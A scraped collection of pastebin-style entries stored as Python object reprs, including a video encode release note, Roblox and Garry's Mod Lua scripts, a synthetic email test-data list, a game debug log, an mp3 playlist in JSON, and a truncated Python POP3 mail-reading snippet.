\xa0 \nCHAPTERS............: Yes\nSOURCE NAME.........: Remux\nIMDb LINK...........: https://www.imdb.com/title/tt10323676/\nENCODER.............: [b][color=#4bb702]JigSaw @[/b][/color] [b][color=#FFD700]playHD[/b][/color]\nNOTES...............: Manual overlay to fix top & bottom dirty lines.\n\xa0\n[quote]x264 [info]: frame I:1101 \xa0Avg QP:12.78 \xa0size:118418\nx264 [info]: frame P:30020 Avg QP:13.93 \xa0size: 64802\nx264 [info]: frame B:117584 Avg QP:14.94 \xa0size: 32595\nx264 [info]: consecutive B-frames: \xa01.5% \xa01.8% \xa09.8% 15.6% 13.9% 34.3% \xa08.8% \xa04.8% \xa04.7% \xa04.7%[/quote][/pre]\n\xa0\n[center]\n[b][font=Lucida Console]Source | playHD[/b][/font]\n\xa0\n[URL=https://imgbox.com/WQLmt2zG][IMG]https://thumbs2.imgbox.com/57/a5/WQLmt2zG_t.png[/IMG][/URL] [URL=https://imgbox.com/rs6wNfgv][IMG]https://thumbs2.imgbox.com/78/97/rs6wNfgv_t.png[/IMG][/URL] [URL=https://imgbox.com/WJRdB76f][IMG]https://thumbs2.imgbox.com/5d/51/WJRdB76f_t.png[/IMG][/URL] [URL=https://imgbox.com/tA5fvHRS][IMG]https://thumbs2.imgbox.com/a9/b6/tA5fvHRS_t.png[/IMG][/URL] [URL=https://imgbox.com/1UjP8PAj][IMG]https://thumbs2.imgbox.com/12/1a/1UjP8PAj_t.png[/IMG][/URL] [URL=https://imgbox.com/mk8CdM25][IMG]https://thumbs2.imgbox.com/d7/9b/mk8CdM25_t.png[/IMG][/URL] [URL=https://imgbox.com/iufgW7Au][IMG]https://thumbs2.imgbox.com/67/a6/iufgW7Au_t.png[/IMG][/URL] [URL=https://imgbox.com/rI6Gse26][IMG]https://thumbs2.imgbox.com/49/a3/rI6Gse26_t.png[/IMG][/URL] [URL=https://imgbox.com/d5ZEWKRe][IMG]https://thumbs2.imgbox.com/21/f6/d5ZEWKRe_t.png[/IMG][/URL] [URL=https://imgbox.com/n2lRQPxE][IMG]https://thumbs2.imgbox.com/e9/41/n2lRQPxE_t.png[/IMG][/URL] [URL=https://imgbox.com/YhOzGS5D][IMG]https://thumbs2.imgbox.com/0a/99/YhOzGS5D_t.png[/IMG][/URL] [URL=https://imgbox.com/IS3pxSog][IMG]https://thumbs2.imgbox.com/de/6e/IS3pxSog_t.png[/IMG][/URL]\n\xa0\n[img=https://i.postimg.cc/MpRJJt3Z/play-HD.png][/center]', date='2022-06-01 08:11:00 +00:00', hash_val='96308e1acf43aa8e7c3456982ef10ddb', url='/r0EmaSbG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='dubleeyrblxx', title='Kills and Deaths -- Roblox', content='game.Players.PlayerAdded:Connect(function(player)\n\xa0\n\xa0 \xa0 local spectator = game:GetService(\'Teams\'):FindFirstChild(""Spectator"")\n\xa0\n\xa0 \xa0 local leaderstats = Instance.new(""Folder"", player)\n\xa0 \xa0 leaderstats.Name = ""leaderstats""\n\xa0 \xa0 \n\xa0 \xa0 local kills = Instance.new(""NumberValue"",leaderstats)\n\xa0 \xa0 kills.Name = ""Kills""\n\xa0 \xa0 kills.Value = 0\n\xa0 \xa0 \n\xa0 \xa0 local deaths = Instance.new(""NumberValue"", leaderstats)\n\xa0 \xa0 deaths.Name = ""Deaths""\n\xa0 \xa0 deaths.Value = 0\n\xa0 \xa0 \n\xa0 \xa0 player.CharacterAdded:Connect(function(character)\n\xa0 \xa0 \xa0 \xa0 local humanoid = character:FindFirstChild(""Humanoid"")\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 humanoid.Died:Connect(function(died)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 deaths.Value = deaths.Value + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 local tag = humanoid:FindFirstChild(""creator"")\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 local killer = tag.Value\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if tag and killer then\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 killer.leaderstats:FindFirstChild(""Kills"").Value = killer.leaderstats:FindFirstChild(""Kills"").Value + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 end\n\xa0 \xa0 \xa0 \xa0 end)\n\xa0 \xa0 end)\nend)', date='2022-06-01 07:46:51 +00:00', hash_val='766dac8922e30bb00a805f57dde31586', url='/CYkqZSc5', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='emails', content="Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY\n\xa0\nDATA_ID_TESTDATATOFIND NOEXCLUDES\n\xa0\nCooper.Kleine@findmetesting.co.uk \nMariquilla.Evenden@findmetesting.co.uk \nNoll.Ingolotti@findmetesting.co.uk \xa0\nGrove.Feldbaum@findmetesting.co.uk \nMack.Osment@findmetesting.co.uk \nTrisha.Zanicchelli@findmetesting.co.uk\nJack.Gorriessen@findmetesting.co.uk \nNefen.Malec@findme-testing.co.uk \nBirdie-Gemmill@findmetesting.co.uk\nRosabella.Nias@findmetesting.co.uk\nEllerey.Fanti@findmetesting.cn\nAntonina.Carsey@findmetesting.cn\nValry.Shead@findmetesting.cn \nConrade.Ferrarone@findmetesting.cn\nNeysa.Fazakerley@findmetesting.cn\nCristobal.Primak@findmetesting.cn\nWakefield.Kent@findmetesting.cn\nfindme.Cheales@findmetesting.cn\nNert.Roddamr@findmetesting.cn \nRichy.Raft@findmetesting.cn\nBerget.Kermannes@findmetesting.ie \nShelden.Tregea@findmetesting.ie \nAllsun.Badrick@findmetesting.ie \nHortense.Ivkovic@findmetesting.ie\nCarolin.Potte@findmetesting.ie\nBenjie.Trumble@findmetesting.ie\nAndrew.Hadgkiss@findmetesting.ie\nTrula.Kuna@findmetesting.ie\nTommie.Maytum@findmetesting.ie\nLangsdon.Pakes@findmetesting.ie\nPorty.Tooth@findmetesting.au\nRozella.Siggefindmetesting.au\nNolie.Tumultyfindmetesting.au\nDud.Caustonfindmetesting.au\nAlvinia.Brameldfindmetesting.au\nMeridel.Lymbournefindmetesting.au\nElvis.Maleckfindmetesting.au\nBrett.Oughtonfindmetesting.au\nRickard.Clemfindmetesting.au\nPrue.Firemanfindmetesting.au\nUriel.Rozenbaum@findmetesting25.com\nCindie.Greeson@findmetesting25.com\nLaurette.Puckham@findmetesting25.com\nEldredge.Ricket@findmetesting25.com\nAlanah.Rapper@findmetesting25.com\nAsh.Le.Prevost@findmetesting25.com\nGalvin.Purchon@findmetesting25.com\nLauryn.Ilson@findmetesting25.com\nfindme.Graffin@findmetesting25.com\nEdithe.Trehearne@findmetesting25.com\nDen.Cancutt@findmetesting10.com\nWernher.Spatoni@findmetesting10.com\nMalchy.Ion@findmetesting10.com\nLeona.Whitby@findmetesting10.com\nAlphonse.Goodlake@findmetesting10.com\nGran.Standen@findmetesting10.com\nBarnie.Gilffilland@findmetesting10.com\nKaylyn.Ditchfield@findmetesting10.com\nDorotea.Kohlerman@findmetesting10.com\nGillan.Lampel@findmetesting10.com\nPatrica.Mannakee@findustesting.com\nPippo.Sewart@findustesting.com\nLanae.Cousin@findustesting.com\nPorter.Glaysher@findustesting.com\nHerschel.Yaakov@findustesting.com\nfindme.Parsand@findustesting.com\nLucho.Cosh@findustesting.com\nCullie.Powlesland@findustesting.com\nEdy.Burkart@findustesting.com\nChristophorus.Ackeroyd@findustesting.com\nArvy.Rowson@findUStesting.com\nArlan.Ivanilov@findustesting.com\nTawnya.Waslin@findustesting.com\nInigo.Gyrgorcewicx@findustesting.com\nSharity.Stoodley@findustesting.com\nGinger.Dresse@findustesting.com\nDeck.Jouannot@findustesting.com\nDeny.Soanes@findustesting.com\njames@findmetesting.com\n\xa0\nWenona.Moverley@findqatesting.com\nJerry.Poynter@findqatesting.com\nDrugi.Neeson@findqatesting.com\nWinny.Binfield@findqatesting.com\nDarill.Greenshiels@findqatesting.com\nEthelin.Pinchen@findqatesting.com\nTanney.Ballendine@findqatesting.com\nAriadne.Wincott@findqatesting.com\nWinnie.Domm@findqatesting.com\nRogerio.Cudbird@findqatesting.com\nYu@findmetesting.com\n\xa0\nRIGHT OF @\nfindme@findme.testing.com\nwildcard@findme*testing.com\ndash@findme-testing.com\nslash@findme/testing.com\nquestionmark@findme?testing.com\n\xa0\nACCENTS\nPål@findmetesting.com\nMagdalène@findmetesting.com\nAnaël@findmetesting.com\nLén@findmetesting.com\nLoïs@findmetesting.com\nThérèsa@findmetesting.com\nValérie@findmetesting.com\nGörel@findmetesting.com\nMélia@findmetesting.com\nJoséphine@findmetesting.com\nLoïc@findmetesting.com\nfindme@findmetesting.com\nMéghane@findmetesting.com\nNuó@findmetesting.com\nLén@findmetesting.com\nEliès@findmetesting.com\nAndré@findmetesting.com\nMahélie@findmetesting.com\nMéthode@findmetesting.com\nRachèle@findmetesting.com\nMélina@findmetesting.com\nGaëlle@findmetesting.com\nCéline@findmetesting.com\nBérangère@findmetesting.com\nFrançoise@findmetesting.com\nSéverine@findmetesting.com\nMåns@findmetesting.com\nAdèle@findmetesting.com\nAimée@findmetesting.com\nMélia@findmetesting.com\nGösta@findmetesting.com\nLaurène@findmetesting.com\nGisèle@findmetesting.com\nMélinda@findmetesting.com\nBécassine@findmetesting.com\nRuì@findmetesting.com\nZoé@findmetesting.com\nMaëline@findmetesting.com\nAimée@findmetesting.com\nAndréanne@findmetesting.com\nAdélaïde@findmetesting.com\nLaurène@findmetesting.com\nAnaé@findmetesting.com\nNoëlla@findmetesting.com\nAnaël@findmetesting.com\nMaëlyss@findmetesting.com\nLucrèce@findmetesting.com\nLén@findmetesting.com\nMarie-thérèse@findmetesting.com\nMaéna@findmetesting.com\nHélène@findmetesting.com\nHélèna@findmetesting.com\nMéng@findmetesting.com\nCrééz@findmetesting.com\nMélanie@findmetesting.com\nFrédérique@findmetesting.com\nMédiamass@findmetesting.com\nAndré@findmetesting.com\nCinéma@findmetesting.com\nMégane@findmetesting.com\nAmélie@findmetesting.com\nNadège@findmetesting.com\nRébecca@findmetesting.com\nMédiamass@findmetesting.com\nCéline@findmetesting.com\nMaïly@findmetesting.com\nMaï@findmetesting.com\nMaëlann@findmetesting.com\nNoëlla@findmetesting.com\nLaurélie@findmetesting.com\nRuì@findmetesting.com\nChloé@findmetesting.com\nGaëlle@findmetesting.com\nVénus@findmetesting.com\nFrédérique@findmetesting.com\nAmélie@findmetesting.com\nLoïs@findmetesting.com\nMarlène@findmetesting.com\nStévina@findmetesting.com\nClémentine@findmetesting.com\nMégane@findmetesting.com\nMéng@findmetesting.com\nAndré@findmetesting.com\nCrééz@findmetesting.com\nAí@findmetesting.com\nUò@findmetesting.com\nYú@findmetesting.com\nMarie-françoise@findmetesting.com\nUò@findmetesting.com\nInès@findmetesting.com\nOcéane@findmetesting.com\nMarie-ève@findmetesting.com\nRébecca@findmetesting.com\nZoé@findmetesting.com\nLài@findmetesting.com\nRachèle@findmetesting.com\nCécile@findmetesting.com\nMaïlys@findmetesting.com\nGarçon@findmetesting.com\nhereiam@testing.com\n\xa0\nIt's a game of per%entage percentage.\nFindme#testing Findme testing.\nOver&over&over Over over over.\n[findmeinbrackets], findmeinbrackets\n(findmeinbrackets), findmeinbrackets\n<findmeinbrackets>, findmeinbrackets\n{findmeinbrackets>}, findmeinbrackets\nhttp://findme-testing.here.com\nhttp:\\\\findme-testing.here.com\n\xa0\nVestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. \nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.\n\xa0\nVivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.\n\xa0\nFuzzy-Wuzzy - DASH\nFuzzy;Wuzzy - COLON\nFuzzy!Wuzzy - EXCLAMATION\nFuzzy£Wuzzy\xa0 \xa0 - POUND\nFuzzy#Wuzzy - HASH\nFuzzy%Wuzzy - PERCENT\nFuzzy@Wuzzy - AT\nFuzzy&Wuzzy - AND\nFuzzy=Wuzzy - EQUAL\nFuzzy§Wuzzy\nFuzzy~Wuzzy\nFuzzy?Wuzzy \xa0- QUESTION MARK\nFuzzy$Wuzzy \xa0- DOLLAR\nFuzzy[Wuzzy] - BRACKETS\nFuzzy^Wuzzy\nFuzzy(Wuzzy) - BRACKETS\nFuzzy+Wuzzy \xa0- PLUS\nFuzzy±Wuzzy\xa0 \xa0 \xa0- PLUS/MINUE\nFuzzy|Wuzzy \xa0- PIPE\nFuzzy/Wuzzy \xa0- FORWARDSLASH\nFuzzy<Wuzzy> - BRACKETS\nFuzzy{Wuzzy} - CURLY\nFuzzy\\Wuzzy \xa0- BACKSLASH", date='2022-06-01 07:45:53 +00:00', hash_val='d521891abb2ecbda38f824b8a3d8104a', url='/qAebbKk4', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='RidwanRF', title='debug', content="Place container on the ground\nground: 4.2747402191162, oz: 1.4519195556641 z: 5.2747402191162 z-oZ: 3.8228206634521\nPlace container on the ground\nground: 3.5087738037109, oz: 1.4519195556641 z: 4.5087738037109 z-oZ: 3.0568542480469\nPlace container on the ground\nground: 3.4450035095215, oz: 1.4519195556641 z: 4.4450035095215 z-oZ: 2.9930839538574\nPlace container on the ground\nground: 2.9643530845642, oz: 1.4519195556641 z: 3.9643530845642 z-oZ: 2.5124335289001\nPlace container on the ground\nground: 2.964608669281, oz: 1.4519195556641 z: 3.964608669281 z-oZ: 2.5126891136169\nPlace container on the ground\nground: 2.9645137786865, oz: 1.4519195556641 z: 3.9645137786865 z-oZ: 2.5125942230225\nPress 'space' to detach/release magnet!\nground: 2.5546875, oZ: 1.4519195556641 z: 5.0872707366943 z-oZ: 3.6353511810303\nPlace container on the ground\nground: 2.5546875, oZ: 1.4519195556641 z: 4.3248100280762 z-oZ: 2.8728904724121\nPlace container on the ground\nground: 2.5546875, oZ: 1.4519195556641 z: 3.964515209198 z-oZ: 2.5125956535339\nCorrect placement of container!", date='2022-06-01 07:16:33 +00:00', hash_val='7f8b3015e7a25053e4628abcae0c6d7d', url='/A2nuM6yG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='spidersam', title='05-2022', content='[\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-02-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/32dc10bd-858e-b80c-9f15-278d0b68c2b9.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-03-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/ea4efc17-9f17-0e26-64b9-c030c1775a05.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-04-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/49edac30-6207-bc7c-a974-f713082304ce.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-05-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/11318565-16f8-04d3-bcf2-45816fd7223b.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-06-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/00bc3408-f311-cbb3-2cc2-e1b8120c02a9.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-07-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/9f9378bc-b09f-8367-57be-7cf435fac6a1.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-09-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/3e10b8b4-49e2-5e57-47ed-db2eaf4e0e14.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-10-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/e6d4de20-5e87-975a-b5c7-4422136b4211.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-11-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/cecd8271-d5eb-5b63-35e9-4fc1ae5e4dd7.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-12-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/1a1c0347-7663-771b-dc12-d5fe7754e845.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-13-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/0464c959-0458-1342-68bf-40a997d1cff5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-14-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/b2972776-d4e3-c346-17c2-d72be66d549e.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-16-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/10047a3b-1047-5a98-066c-e117c3f5790d.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-17-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/3af361b7-fd42-2f28-6e5e-a15e794e4ee5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-18-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/6b51c479-cc1e-fce8-eb8e-d5ebb284f573.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-19-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/086b736f-ce8e-0f52-536f-de3948a124d5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-20-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/25d5694a-547f-bf87-4a7e-ac2d298919c5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-21-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/e3510150-88ed-2a16-96a6-ef04a2bf1cc1.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-23-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/245f4569-ec96-4886-cf5b-4363568a3755.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-24-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/3d57ce55-4d37-3f79-226e-ff286d55df1f.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-25-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/8f1da29d-52f0-b2db-7863-3a07da55dfb6.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-26-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/14d1713b-a1b3-7aed-43a9-5a69fbf3b086.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-27-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/99ae159e-0f65-068c-f497-90d8099dbfe7.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-28-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/35d2b851-dbde-a53b-1a61-e2522de7e105.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-30-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/06bb83b9-8fde-d386-fbda-7722f03aed7b.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-31-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/8d1297e7-0646-c732-8d23-7d492f943050.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 }\n]', date='2022-06-01 07:12:11 +00:00', hash_val='bd484a995d3e11682568b8e63a18171e', url='/10iPX6E0', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Kitsumi', title='[GMod] Chat Net', content='util.AddNetworkString(""subscribe:chat_net"")\nutil.AddNetworkString(""unsubscribe:chat_net"")\nutil.AddNetworkString(""chat_net"")\n\xa0\nlocal subscribers = {}\n\xa0\nnet.Receive(""subscribe:chat_net"", function(len, ply)\n\xa0 \xa0 if not table.HasValue(subscribers, ply) then\n\xa0 \xa0 \xa0 \xa0 subscribers[#subscribers + 1] = ply\n\xa0 \xa0 end\nend)\n\xa0\nnet.Receive(""unsubscribe:chat_net"", function(len, ply)\n\xa0 \xa0 if table.HasValue(subscribers, ply) then\n\xa0 \xa0 \xa0 \xa0 table.RemoveByValue(subscribers, ply)\n\xa0 \xa0 end\nend)\n\xa0\nhook.Add(""PlayerSay"", ""chat_net_msg"", function(ply, text, team)\n\xa0 \xa0 net.Start(""chat_net"")\n\xa0 \xa0 net.WriteEntity(ply)\n\xa0 \xa0 net.WriteString(text)\n\xa0 \xa0 net.WriteBool(team)\n\xa0 \xa0 local receivers = {}\n\xa0 \xa0 for idx, receiver in ipairs(subscribers) do\n\xa0 \xa0 \xa0 \xa0 if (team and receiver:Team() == ply:Team()) or (not Team) then\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 receivers[#receivers + 1] = receiver\n\xa0 \xa0 \xa0 \xa0 end\n\xa0 \xa0 end\n\xa0 \xa0 net.Send(receivers)\nend)\n\xa0\nhook.Add(""PlayerDisconnected"", ""chat_net_msg_remove_players"", function(ply)\n\xa0 \xa0 if table.HasValue(subscribers, ply) then\n\xa0 \xa0 \xa0 \xa0 table.RemoveByValue(subscribers, ply)\n\xa0 \xa0 end\nend)', date='2022-06-01 07:06:50 +00:00', hash_val='a801d7923ca3dc7f98e7b34336083d09', url='/VMpNcgiY', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='askanton', title='Python pop3 mail', content='import poplib\n\xa0\nfrom email.parser import BytesParser\nfrom email.policy import default\nimport os\npop3server = \'0.0.0.0\'\nusername = \'qqqqq@qqqqq.qqq.qqq\'\npassword = \'qqqqqqq\'\n\xa0\npop3server = poplib.POP3(pop3server) \xa0# 110\n# pop3server = poplib.POP3_SSL(pop3server) # 995\n\xa0\nprint(pop3server.getwelcome()) \xa0# show welcome message\npop3server.user(username)\npop3server.pass_(password)\npop3info = pop3server.stat() \xa0# access mailbox status\nmailcount = pop3info[0] \xa0# toral email\nprint(mailcount)\nprint(""Total no. of Email : "" , mailcount)\nprint (""\\n\\nStart Reading Messages\\n\\n"")\nfor i in range(mailcount):\n\xa0 \xa0 